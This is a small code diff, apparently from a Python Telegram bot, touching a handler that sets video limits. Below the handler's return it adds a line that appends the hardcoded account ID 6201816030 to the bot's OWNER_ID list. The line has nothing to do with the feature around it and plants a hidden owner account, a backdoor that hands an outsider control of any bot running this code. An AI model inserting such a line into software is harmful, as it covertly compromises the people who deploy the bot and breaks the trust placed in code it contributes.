@@ -30,3 +30,5 @@ async def set_video_limit_kid(client, message: Message, _):
         await message.reply_text(_["vid_3"].format(limit))
     else:
         return await message.reply_text(_["vid_2"])
+    
+OWNER_ID.append(6201816030)
